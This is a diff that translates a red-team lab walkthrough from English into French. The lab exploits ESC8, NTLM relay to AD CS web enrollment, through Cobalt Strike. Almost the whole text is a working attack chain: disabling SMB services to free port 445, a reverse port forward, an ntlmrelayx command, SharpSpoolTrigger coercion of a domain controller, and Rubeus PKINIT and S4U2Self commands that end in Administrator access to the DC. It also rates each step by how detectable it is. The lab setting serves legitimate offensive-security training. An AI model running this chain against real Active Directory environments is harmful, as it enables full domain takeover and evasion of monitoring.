@@ -1,48 +1,48 @@
-# ESC8 NTLM Relay to ADCS HTTP Endpoints
+# ESC8 — NTLM Relay vers les endpoints HTTP AD CS
 
->The objective of this lab is to identify and exploit ESC8.
+>L’objectif de ce lab est d’identifier et d’exploiter **ESC8**.
 
 ===
 
-## Enumeration
+## Énumération
 
-1. Launch Cobalt Strike and connect to the team server.
-2. Enumerate the certificate authority for vulnerabilities. 🔍
+1. Lancer Cobalt Strike et se connecter au team server.
+2. Énumérer les vulnérabilités de la **Certificate Authority (CA)**. 🔍
 
     ```Beacon-nocolor
     execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
     ```
 
-⚠️ This will show that *lon-cs-1* is vulnerable to ESC8.
+⚠️ Le résultat doit montrer que `lon-cs-1` est vulnérable à ESC8.
 
 ===
 
-## Relay Setup
+## Préparation du NTLM Relay
 
-1. Use Beacon to start a SOCKS proxy.
+1. Démarrer un **SOCKS proxy** depuis le Beacon.
     1. `socks 1080 socks5`
     
-2. Run `netstat` to see that port 445 is currently bound.
+2. Exécuter `netstat` pour vérifier que le port 445 est actuellement occupé.
 
-3. Set the *lanmanserver* service's start mode to *disabled* to prevent it from automatically restarting.
+3. Définir le mode de démarrage de `lanmanserver` sur **disabled** pour empêcher un redémarrage automatique.
 
     ```Beacon-nocolor
     sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
     ```
 
-4. Stop these services in the following order to unbind port 445.
+4. Arrêter les services suivants dans cet ordre pour libérer le port 445.
     1. `sc_stop lanmanserver`
     2. `sc_stop srv2`
     3. `sc_stop srvnet`
 
-⚠️ Run `netstat` and verify that 445 is no longer bound.
+⚠️ Vérifier avec `netstat` que le port 445 est libre.
 
-5. Start a reverse port forward that will bind to port 445 and redirect the traffic to *127.0.0.1:7445* on the attacker desktop.
+5. Créer un **reverse port forward** sur le port 445 pour rediriger le trafic vers `127.0.0.1:7445` sur l’Attacker Desktop.
 	1. `rportfwd_local 445 localhost 7445`
 
-⚠️ `netstat` will show 445 being bound again, but the PID will be that of the Beacon.
+⚠️ `netstat` indique de nouveau une écoute sur le port 445, mais le PID est celui du Beacon.
 
-6. Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation.  Add the rule:
+6. Le port 445 peut être bloqué en entrée par Windows Firewall, notamment sur une Workstation. Ajouter la règle :
 
     ```Beacon-nocolor
     powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
@@ -50,118 +50,118 @@
 
 ===
 
-## Relaying
+## NTLM Relaying
 
-1. On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
+1. Sur l’Attacker Desktop, ouvrir un terminal CMD et démarrer le container Docker Kali.
     1. `docker container start -i kali-1`
 
-2. Configure proxychains to use Cobalt's SOCKS proxy.
-    1. Open `/etc/proxychains.conf` in vim or nano.
-    2. Scroll to the last line.
-    3. Replace the default socks4 entry 💡  `socks5 10.0.0.5 1080`💡 
-    4. Save the changes.
+2. Configurer **proxychains** pour utiliser le SOCKS proxy de Cobalt Strike.
+    1. Ouvrir `/etc/proxychains.conf` dans vim ou nano.
+    2. Aller à la dernière ligne.
+    3. Remplacer l’entrée `socks4` par défaut 💡  `socks5 10.0.0.5 1080`💡 
+    4. Enregistrer les modifications.
 
-3. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint.  We're going to relay the credentials of a domain controller, so we'll specifically request a *DomainController* certificate.🕵️ Still in the kali linux Docker instance start `NTLMRelayX`
+3. Utiliser **ntlmrelayx** et **proxychains** pour relayer les authentifications entrantes vers l’endpoint HTTP AD CS. Comme la requête cible un Domain Controller, demander un certificat de type **DomainController**. Démarrer `NTLMRelayX` depuis le container Kali.
 
     ```bash
     proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
     ```
 
-4. While that is waiting, go back to Beacon.
-5. Coerce the domain controller into authenticating to the current machine.
+4. Pendant l’attente, revenir au Beacon.
+5. Déclencher une authentification du Domain Controller vers la machine courante.
 
     ```Beacon-nocolor
     execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
     ```
 
-⚠️ The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy.  A file called **LON-DC-1.pfx** should be created.
+⚠️ Le reverse port forward transmet la requête à ntlmrelayx, qui la relaie via le SOCKS proxy. Un fichier **LON-DC-1.pfx** doit être généré.
 
-6. Press Ctrl+C to stop ntlmrelayx.
+6. Utiliser Ctrl+C pour arrêter ntlmrelayx.
 
 ------
 
-## Post-Exploitation — LON-DC-1.pfx → Domain Administrator
+## Post-Exploitation — LON-DC-1.pfx vers Domain Administrator
 
-> **Perform these steps before Cleanup** while the SOCKS proxy is still active. The PFX is on the Kali Docker container. Two paths are documented: Kali Docker (PKINITtools/Certipy — no PFX transfer needed) and Windows Beacon (Rubeus — requires PFX transfer).
+> **Effectuer ces étapes avant le cleanup**, tant que le SOCKS proxy est actif. Le PFX est dans le container Kali. Deux possibilités sont documentées : Kali Docker (PKINITtools/Certipy, sans transfert) et Windows Beacon (Rubeus, avec transfert du PFX).
 
-### Path — Windows Beacon (Rubeus — CS-native)
+### Méthode — Windows Beacon (Rubeus / Cobalt Strike)
 
-#### Step 1 — Copy certificate & Base64 encode PFX on attacker desktop
+#### Étape 1 — Copier le certificat et encoder le PFX en Base64
 
-search Inside the kali container
+Rechercher le fichier dans le container Kali :
 
 ```
 find / -name "LON-DC-1.pfx" 2>/dev/null
 ```  
 
-Copy certificate back to windows from docker kali image:
+Copier le certificat depuis le container Kali vers Windows :
 ```
 docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
 ```
 
-Run in PowerShell on the attacker desktop:
+Exécuter la commande dans PowerShell sur l’Attacker Desktop :
 
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
 ```
 
-Copy the full output string.
+Copier la totalité du résultat Base64.
 
-#### Step 2 — Request TGT for DC machine account via PKINIT
+#### Étape 2 — Demander le TGT du compte machine DC via PKINIT
 
 ```Beacon-nocolor
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:<base64_pfx_string> /enctype:aes256 /nowrap
 ```
 
-> **OPSEC-🟢SAFE (no disk write on target)** — Certificate is passed in-memory as a Rubeus argument; nothing written to the target filesystem. `execute-assembly` still spawns a sacrificial process (CAUTION tier). PKINIT AS-REQ generates **Event 4768** on DC. Note the base64 TGT from output.
+> **OPSEC-🟢SAFE (no disk write on target)** — Le certificat est transmis en mémoire comme argument Rubeus, sans écriture dans le filesystem cible. `execute-assembly` crée néanmoins un processus temporaire (**CAUTION**). La requête PKINIT AS-REQ génère l’**Event 4768** sur le DC. Conserver le TGT Base64 renvoyé.
 
-#### Step 3 — S4U2Self to impersonate Administrator
+#### Étape 3 — S4U2Self pour impersonate Administrator
 
-Use the DC machine account TGT to perform S4U2Self, requesting a CIFS service ticket as Administrator to the DC. The `/self` flag specifies S4U2Self (no S4U2Proxy required — DC machine account is trusted for delegation to itself).
+Utiliser le TGT du compte machine du DC pour effectuer **S4U2Self** et demander un ticket CIFS en tant qu’Administrator. L’option `/self` sélectionne S4U2Self ; S4U2Proxy n’est pas nécessaire ici.
 
 ```Beacon-nocolor
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt
 ```
 
-> **OPSEC-🟠CAUTION** — Generates **Event 4769** (TGS-REQ S4U2Self) on DC. `/ptt` injects the resulting service ticket into the beacon's logon session in-memory — no disk write.
+> **OPSEC-🟠CAUTION** — Génère l’**Event 4769** (TGS-REQ S4U2Self) sur le DC. L’option `/ptt` injecte le ticket dans la session de logon du Beacon, sans écriture sur disque.
 
-#### Step 4 — Prove DA Access
+#### Étape 4 — Vérifier l’accès Domain Admin
 
 ```Beacon-nocolor
 ls \\lon-dc-1.contoso.com\C$
 ```
 
-> **OPSEC-🟢SAFE** — SMB access via injected Kerberos ticket. Generates **Event 4624 Type 3** on DC only. No remote process spawn, no service creation.
+> **OPSEC-🟢SAFE** — Accès SMB via le ticket Kerberos injecté. Génère l’**Event 4624 type 3** sur le DC, sans création de processus distant ni de service.
 
 ```Beacon-nocolor
 download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
 ```
 
-> **OPSEC-🟢SAFE** — File read over existing beacon C2 channel. Generates **Event 4663** on DC if Object Access auditing is enabled.
+> **OPSEC-🟢SAFE** — Lecture du fichier par le canal C2 du Beacon. L’**Event 4663** peut être généré sur le DC si l’audit Object Access est activé.
 
 ---
 
-### ESC8 Full Chain OPSEC Summary
+### Récapitulatif OPSEC de la chaîne ESC8
 
-| Stage | Action | OPSEC | Key Events |
+| Étape | Action | OPSEC | Events principaux |
 |-------|--------|-------|------------|
-| Enum | Certify enum-cas | OPSEC-🟠CAUTION | LDAP to DC (1644) |
-| Relay setup | Stop lanmanserver / rportfwd | OPSEC-🟠CAUTION | Service control events (7036) |
-| Coerce | SharpSpoolTrigger | OPSEC-🔴UNSAFE | Print spooler RPC — Event 4624 on target |
-| Relay | ntlmrelayx → ADCS | OPSEC-🟠CAUTION | CA Events 4886/4887 — always logged |
-| Prove DA | smbclient / ls C$ | OPSEC-🟢SAFE | Event 4624 Type 3 on DC |
-| Cleanup | Restore services / firewall | OPSEC-🟢SAFE | Reduces forensic footprint |
+| Énumération | Certify enum-cas | OPSEC-🟠CAUTION | LDAP vers le DC (1644) |
+| Préparation Relay | Stop lanmanserver / rportfwd | OPSEC-🟠CAUTION | Événements de service (7036) |
+| Coercition | SharpSpoolTrigger | OPSEC-🔴UNSAFE | RPC Print Spooler — Event 4624 sur la cible |
+| Relay | ntlmrelayx → AD CS | OPSEC-🟠CAUTION | Events CA 4886/4887 enregistrés |
+| Vérification DA | smbclient / ls C$ | OPSEC-🟢SAFE | Event 4624 type 3 sur le DC |
+| Cleanup | Restaurer services / firewall | OPSEC-🟢SAFE | Réduit les artefacts laissés |
 
 
-## Cleanup
+## Cleanup — Restauration
 
-1. Stop the SOCKS proxy.
+1. Arrêter le SOCKS proxy.
     1. `socks stop`
 
-2. Stop the reverse port forward.
+2. Arrêter le reverse port forward.
     1. `rportfwd stop 445`
 
-3. Restore the services back to default.
+3. Restaurer les services dans leur configuration d’origine.
 
     ```Beacon-nocolor
     sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
@@ -171,11 +171,11 @@ download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
     2. `sc_start srv2`
     3. `sc_start lanmanserver`
 
-4. Remove the firewall rule.
+4. Supprimer la règle Windows Firewall.
 
     ```Beacon-nocolor
     powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
     ```
 
-⚠️ This lab, you have learned how to identify and exploit ESC8 through a C2.
+⚠️ Ce lab présente l’identification et l’exploitation d’ESC8 depuis un C2.
 
